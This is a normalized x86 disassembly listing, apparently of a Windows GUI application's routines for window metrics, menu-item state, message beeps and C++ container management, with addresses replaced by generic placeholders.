call [ GetSystemMetrics@IAT ]
test edi 0x200000
je r-xdata
add esp 0x10
retn
pop edi
mov eax esi
pop esi
add esp 0x10
retn
add esi eax
sub_4aa150
mov eax [ rw-data ]
sub esp 0x10
test eax eax
jne r-xdata
push esi
push edi
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov edx [ rw-data ]
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0xc ]
push 0xfffffff0
push edx
sub esi ecx
call [ GetWindowLongA@IAT ]
push 0x3
mov edi eax
call [ GetSystemMetrics@IAT ]
test edi 0x100000
je r-xdata
add esp 0x10
retn
pop edi
mov eax esi
pop esi
add esp 0x10
retn
add esi eax
sub_4aa1d0
push ebx
push esi
mov esi [ rw-data ]
mov ebx ecx
mov ecx [ rw-data ]
push edi
xor edx edx
mov eax esi
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
jl r-xdata
mov eax [ ecx + edx * 4 ]
cmp eax 0xffffffff
je r-xdata
cmp edx eax
jge r-xdata
xor eax eax
cmp esi [ rw-data ]
jge r-xdata
inc edx
jmp r-xdata
cmp eax [ ebx + 0x4 ]
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + edx * 4 ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_4440b0
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x0
push edx
call sub_4706c0
add esp 0x10
test eax eax
jl r-xdata
mov edi [ rw-data ]
test edi edi
jne r-xdata
mov ecx [ rw-data ]
mov esi [ ecx + eax * 4 ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_4440b0
pop edi
pop esi
pop ebx
retn
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx esi
imul ecx ecx 0x70
mov eax [ ecx + edi + 0x4c ]
add ecx edi
test eax eax
jne r-xdata
cmp esi edx
jge r-xdata
pop edi
pop esi
pop ebx
retn
lea edx [ ecx + 0x50 ]
push edx
add ecx 0x4c
push ecx
push esi
call sub_460b70
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ rw-data ]
imul eax eax 0x70
mov eax [ eax + ecx + 0x4c ]
pop edi
pop esi
pop ebx
retn
sub_4aa2f0
push ebx
push esi
mov esi [ rw-data ]
mov ebx ecx
mov ecx [ rw-data ]
push edi
xor edx edx
mov eax esi
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
jl r-xdata
mov eax [ ecx + edx * 4 ]
cmp eax 0xffffffff
je r-xdata
cmp edx eax
jge r-xdata
xor eax eax
cmp esi [ rw-data ]
jge r-xdata
inc edx
jmp r-xdata
cmp eax [ ebx + 0x4 ]
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + edx * 4 ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_444100
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x0
push edx
call sub_4706c0
add esp 0x10
test eax eax
jl r-xdata
mov edi [ rw-data ]
test edi edi
jne r-xdata
mov ecx [ rw-data ]
mov esi [ ecx + eax * 4 ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_444100
pop edi
pop esi
pop ebx
retn
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx esi
imul ecx ecx 0x70
mov eax [ ecx + edi + 0x50 ]
add ecx edi
test eax eax
jne r-xdata
cmp esi edx
jge r-xdata
pop edi
pop esi
pop ebx
retn
lea edx [ ecx + 0x50 ]
push edx
add ecx 0x4c
push ecx
push esi
call sub_460b70
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ rw-data ]
imul eax eax 0x70
mov eax [ eax + ecx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_4aa410
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jge r-xdata
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax r--data
pop esi
retn
pop edi
mov eax r--data
pop esi
retn
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
test edx edx
je r-xdata
cmp esi edx
jge r-xdata
imul esi esi 0x70
mov edx [ esi + edi + 0x18 ]
lea eax [ esi + edi ]
mov ecx 0x10
cmp edx ecx
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
push eax
call sub_457f40
add esp 0x4
pop edi
add eax esi
pop esi
retn
mov eax [ eax + 0x4 ]
push eax
call sub_457f40
add esp 0x4
pop edi
add eax esi
pop esi
retn
cmp [ eax + 0x18 ] ecx
jb r-xdata
sub_4aa4a0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jge r-xdata
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax r--data
pop esi
retn
pop edi
mov eax r--data
pop esi
retn
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
test edx edx
je r-xdata
cmp esi edx
jge r-xdata
imul esi esi 0x70
mov eax [ esi + edi + 0x18 ]
add esi edi
cmp eax 0x10
jb r-xdata
pop edi
lea eax [ esi + 0x4 ]
pop esi
retn
mov eax [ esi + 0x4 ]
pop edi
pop esi
retn
sub_4aa500
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jge r-xdata
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
xor eax eax
pop esi
retn
pop edi
xor eax eax
pop esi
retn
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
test edx edx
je r-xdata
cmp esi edx
jge r-xdata
imul esi esi 0x70
mov eax [ esi + edi + 0x20 ]
pop edi
pop esi
retn
sub_4aa550
push ebx
push ebp
push esi
mov esi [ ecx + 0x4 ]
xor ebx ebx
xor ebp ebp
test esi esi
jge r-xdata
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ebp
pop ebp
mov [ eax ] ebx
pop ebx
retn 0x4
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ eax + 0x4 ] ebp
pop ebp
mov [ eax ] ebx
pop ebx
retn 0x4
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
test edx edx
je r-xdata
cmp esi edx
jge r-xdata
mov eax [ esp + 0x14 ]
imul esi esi 0x70
mov ecx [ esi + edi + 0x28 ]
mov [ eax ] ecx
mov edx [ rw-data ]
mov ecx [ esi + edx + 0x2c ]
pop edi
pop esi
pop ebp
mov [ eax + 0x4 ] ecx
pop ebx
retn 0x4
sub_4aa660
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1dd8
push eax
mov eax [ rw-data ]
shl eax 0x4
mov edx [ eax + rw-data ]
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
lea eax [ eax + eax * 4 ]
sub esp 0x28
shl eax 0x5
push esi
mov esi [ ecx ]
add eax edx
mov edx [ eax + 0x30 ]
sub esi 0xc
test edx edx
push edi
je r-xdata
cmp esi edx
mov eax r--data
jge r-xdata
mov edi [ eax + 0x34 ]
sub edi edx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov ecx [ esp + 0x30 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
lea edi [ ecx + 0x8 ]
push eax
push r--data
mov ecx edi
call sub_401e80
mov ecx [ rw-data ]
mov eax [ rw-data ]
shl ecx 0x4
mov ecx [ ecx + rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
mov edx [ eax + ecx + 0x40 ]
movsx edx [ edx + esi * 2 ]
add edx 0xffffff9e
cmp edx 0x11
ja r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
movzx edx [ edx + lookup_table_4aa850 ]
push ebx
jmp [ edx * 4 + jump_table_4aa83c ]
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
pop edi
pop esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov ebx [ eax + ecx + 0x50 ]
lea edx [ esi * 8 ]
cmp [ edx + ebx ] 0x76
je r-xdata
mov ebx [ eax + ecx + 0x50 ]
lea edx [ esi * 8 ]
cmp [ edx + ebx ] 0x76
je r-xdata
mov ebx [ eax + ecx + 0x50 ]
lea edx [ esi * 8 ]
cmp [ edx + ebx ] 0x76
je r-xdata
mov eax [ eax + ecx + 0x50 ]
cmp [ eax + esi * 8 ] 0x76
lea eax [ eax + esi * 8 ]
je r-xdata
pop ebx
mov eax ebx
mov eax [ edx + eax + 0x4 ]
push eax
lea ecx [ esp + 0x14 ]
call sub_4aa600
mov [ esp + 0x3c ] 0x0
mov eax ebx
cmp [ edx + eax ] 0x69
jne r-xdata
mov eax ebx
mov cl [ edx + eax + 0x4 ]
mov [ esp + 0xc ] cl
mov edx [ esp + 0xc ]
push edx
lea ecx [ esp + 0x14 ]
call sub_4aa5d0
mov [ esp + 0x3c ] 0x2
jmp r-xdata
cmp [ eax ] 0x73
jne r-xdata
fld [ edx + eax + 0x4 ]
fild [ edx + eax + 0x4 ]
jmp r-xdata
push 0x1
push edi
lea ecx [ esp + 0x18 ]
call sub_40c510
lea ecx [ esp + 0x10 ]
call sub_40ba70
jmp r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
fstp [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push eax
call sub_4aa630
mov [ esp + 0x3c ] 0x1
jmp r-xdata
push eax
mov ecx edi
call sub_402510
sub_4aa855
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov [ ecx ] r--data
retn
sub_4aa8a0
push esi
mov esi [ esp + 0x8 ]
mov ecx esi
call sub_450380
cmp eax 0x1b
je r-xdata
mov ecx esi
call sub_450380
cmp eax 0x3
jne r-xdata
xor eax eax
pop esi
retn
push edi
mov ecx esi
call sub_44fb20
mov edi [ esp + 0x10 ]
dec eax
mov ecx esi
mov [ edi ] eax
call sub_450380
cmp eax 0xb
jne r-xdata
mov edx [ edi ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] edx
xor edx edx
cmp eax 0x1c
sete dl
pop edi
pop esi
mov eax edx
retn
mov ecx esi
call sub_450380
cmp eax 0x3
je r-xdata
mov ecx esi
call sub_44fb20
mov ecx [ esp + 0x14 ]
dec eax
mov [ ecx ] eax
mov ecx esi
call sub_450380
xor edx edx
cmp eax 0x1c
sete dl
pop edi
pop esi
mov eax edx
retn
pop edi
xor eax eax
pop esi
retn
sub_4aa950
mov eax [ rw-data ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov edx [ eax ]
mov ecx 0x1
cmp edx ecx
je r-xdata
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] ecx
jne r-xdata
mov eax [ rw-data ]
push eax
push eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
call sub_4aa930
push 0x94
push 0x93
call sub_458630
add esp 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x2
mov eax [ rw-data ]
je r-xdata
push eax
push ecx
mov [ rw-data ] 0x2
call sub_4aa930
push 0x93
push 0x94
call sub_458630
add esp 0x10
retn
mov edx eax
mov eax ecx
mov ecx edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov ecx [ rw-data ]
cmp ecx eax
mov [ rw-data ] eax
jle r-xdata
sub_4aaa20
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
lea esp [ esp ]
dec ebx
mov eax ebx
cdq
and edx 0x3
add eax edx
mov ecx eax
sar ecx 0x2
lea eax [ ecx * 4 ]
mov esi ebx
sub esi eax
mov eax [ edi + 0x8 ]
cmp eax ecx
ja r-xdata
cmp [ esp + 0x18 ] ebx
je r-xdata
dec ebp
mov eax ebp
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
mov edi edx
mov edx ebp
sub edx edi
mov edi [ esp + 0x2c ]
mov edi [ edi + 0x8 ]
cmp edi eax
ja r-xdata
sub ecx eax
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x2c ]
pop edi
pop esi
mov [ eax ] ebp
pop ebp
mov [ eax + 0x4 ] edx
pop ebx
retn
mov edi [ esp + 0x24 ]
mov edi [ edi + 0x4 ]
mov ecx [ edi + ecx * 4 ]
mov edi [ esp + 0x2c ]
mov edi [ edi + 0x4 ]
mov eax [ edi + eax * 4 ]
mov ecx [ ecx + esi * 4 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
sub eax edi
mov edi [ esp + 0x24 ]
cmp [ esp + 0x1c ] edi
jne r-xdata
sub_4aaac0
push ebx
mov ebx [ esp + 0x1c ]
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
mov eax edi
cdq
and edx 0x3
add eax edx
mov ecx eax
sar ecx 0x2
lea eax [ ecx * 4 ]
mov esi edi
sub esi eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
ja r-xdata
cmp edi [ esp + 0x20 ]
je r-xdata
mov eax ebx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
mov ebp edx
mov edx ebx
sub edx ebp
mov ebp [ esp + 0x2c ]
mov ebp [ ebp + 0x8 ]
cmp ebp eax
ja r-xdata
sub ecx eax
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x2c ]
pop edi
pop esi
pop ebp
mov [ eax ] ebx
mov [ eax + 0x4 ] edx
pop ebx
retn
mov ebp [ esp + 0x1c ]
mov ebp [ ebp + 0x4 ]
mov ecx [ ebp + ecx * 4 ]
mov ebp [ esp + 0x2c ]
mov ebp [ ebp + 0x4 ]
mov eax [ ebp + eax * 4 ]
mov ecx [ ecx + esi * 4 ]
inc ebx
mov [ eax + edx * 4 ] ecx
inc edi
jmp r-xdata
sub eax ebp
mov ebp [ esp + 0x1c ]
cmp ebp [ esp + 0x24 ]
jne r-xdata
sub_4aab60
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push esi
mov esi [ rw-data ]
cmp esi rw-data
jne r-xdata
push 0x0
call [ MessageBeep@IAT ]
retn
dec ecx
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
mov [ rw-data ] ecx
sub ecx edx
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
cmp ecx [ rw-data ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ ecx ]
pop esi
jmp [ edx + 0xc ]
sub eax edx
push 0x0
call [ MessageBeep@IAT ]
pop esi
retn
sub_4aabd0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push esi
mov esi [ rw-data ]
add eax ecx
cmp esi rw-data
mov ecx [ rw-data ]
jne r-xdata
push eax
call [ MessageBeep@IAT ]
retn
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov edx [ esi + 0x8 ]
cmp edx eax
ja r-xdata
cmp ecx eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ ecx ]
call [ edx + 0x10 ]
inc [ rw-data ]
pop esi
retn
sub eax edx
push 0x0
call [ MessageBeep@IAT ]
pop esi
retn
sub_4aac40
push ecx
mov eax [ rw-data ]
test eax eax
push ebx
push esi
push edi
mov edi rw-data
je r-xdata
mov eax 0x1
cmp [ rw-data ] edi
jne r-xdata
mov eax 0x1
mov ecx [ rw-data ]
add eax ecx
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
mov edi 0x1
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0xc ] edx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov esi [ esp + 0x14 ]
mov ebx [ EnableMenuItem@IAT ]
push eax
push 0x13e
push esi
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x8
push 0x175
push esi
call [ CheckMenuItem@IAT ]
pop edi
pop esi
pop ebx
pop ecx
retn
push 0x0
push 0x175
push esi
call [ CheckMenuItem@IAT ]
pop edi
pop esi
pop ebx
pop ecx
retn
push edi
push 0x143
push esi
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
push eax
push 0x13f
push esi
call ebx
mov edi [ rw-data ]
xor edx edx
test edi edi
sete dl
mov edi edx
push edi
push 0x140
push esi
call ebx
push edi
push 0x141
push esi
call ebx
push edi
push 0x142
push esi
call ebx
push edi
push 0x144
push esi
call ebx
push edi
push 0x146
push esi
call ebx
push edi
push 0x145
push esi
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_4aad70
push ecx
mov edx [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
mov ecx [ esp + 0x20 ]
mov ebx edx
sub ebx eax
mov [ esp + 0xc ] ebx
mov ebx [ esi + 0x10 ]
add ebx eax
push edi
mov ebp ebx
mov edi ecx
sub ebp ecx
sub edi edx
cmp [ esp + 0x10 ] ebp
jae r-xdata
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x24 ]
push eax
push edx
mov edx [ esp + 0x34 ]
push esi
push ebx
push edx
push ecx
lea eax [ esp + 0x38 ]
push eax
call sub_4aaac0
xor edx edx
add esp 0x20
cmp edi edx
jbe r-xdata
mov ebx [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x2c ]
push ebx
push ecx
mov ecx [ esp + 0x2c ]
push ecx
push edx
push esi
push eax
lea edx [ esp + 0x38 ]
push edx
call sub_4aaa20
xor edx edx
add esp 0x20
cmp edi edx
jbe r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx edx
mov [ esp + 0x20 ] esi
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
mov [ esp + 0x1c ] eax
add eax ecx
mov [ esp + 0x1c ] eax
mov ecx [ esi + 0xc ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
dec edi
jne r-xdata
dec eax
jne r-xdata
dec edi
jne r-xdata
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x8 ]
inc eax
shl ebx 0x2
cmp ebx eax
mov [ esi + 0xc ] eax
ja r-xdata
mov eax [ esp + 0x18 ]
pop edi
lea ecx [ esp + 0x18 ]
mov edx [ ecx ]
mov ecx [ ecx + 0x4 ]
pop esi
pop ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ecx
retn 0x14
cmp eax edx
je r-xdata
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] edx
cmp ecx edx
je r-xdata
mov [ esi + 0x10 ] ecx
jmp r-xdata
dec ecx
jne r-xdata
mov [ esi + 0xc ] edx
mov [ esi + 0xc ] edx
sub_4aae70
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_45f700
add esp 0x14
retn 0xc
sub_4aaea0
push 0xffffffff
push sub_4c1df8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4aaf20
push 0xffffffff
push sub_4c1df8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4aafa0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x8 ]
mov eax 0xfffffff
sub eax edx
cmp eax ebx
push edi
jae r-xdata
mov ecx [ esi + 0x8 ]
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
call sub_4aaea0
cmp ebx eax
jae r-xdata
mov eax 0x8
mov edi [ esi + 0xc ]
lea eax [ ecx + ebx ]
shl eax 0x2
push eax
shr edi 0x2
call sub_4b573e
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push edx
mov ebp eax
mov eax [ esi + 0x4 ]
push esi
lea edx [ ebp + edi * 4 ]
lea ecx [ eax + ecx * 4 ]
push edx
lea eax [ eax + edi * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x18
cmp edi ebx
ja r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + ebx * 4 ]
push eax
push ecx
call sub_453050
mov eax [ esi + 0x4 ]
mov [ esp + 0x28 ] 0x0
mov edx [ esp + 0x28 ]
push edx
push esi
lea ecx [ eax + edi * 4 ]
push ebp
lea eax [ eax + ebx * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esp + 0x3c ]
push ecx
push esi
lea edx [ esp + 0x44 ]
push edx
push ebx
push eax
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + edi * 4 ]
push eax
push ecx
call sub_453050
mov ecx [ esp + 0x28 ]
push ecx
push esi
lea edx [ esp + 0x30 ]
push edx
mov ecx ebx
sub ecx edi
push ecx
push eax
call sub_420d80
mov [ esp + 0x3c ] 0x0
mov edx [ esp + 0x3c ]
push edx
push esi
lea eax [ esp + 0x44 ]
push eax
push edi
push ebp
jmp r-xdata
mov ebx eax
call sub_420d80
mov eax [ esi + 0x4 ]
add esp 0x3c
push eax
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
add eax ebx
pop edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
retn 0x4
sub_4ab0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c1e10
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_4aaf20
mov ebx 0x1fffffff
sub ebx edi
cmp ebx edx
jae r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x1fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi edx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x3
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_4aae70
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_4013f0
add esp 0x10
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 8 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edi
call sub_4aae70
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x1c ]
push edx
mov edx ecx
sub edx edi
sar edx 0x3
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_43a250
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp - 0x1c ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax edi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_43a220
add esp 0xc
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x3
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_45f700
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push edi
call sub_4607a0
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 8 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f700
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edi edx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
add edx ebx
lea eax [ ebx + edi * 8 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_4ab380
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
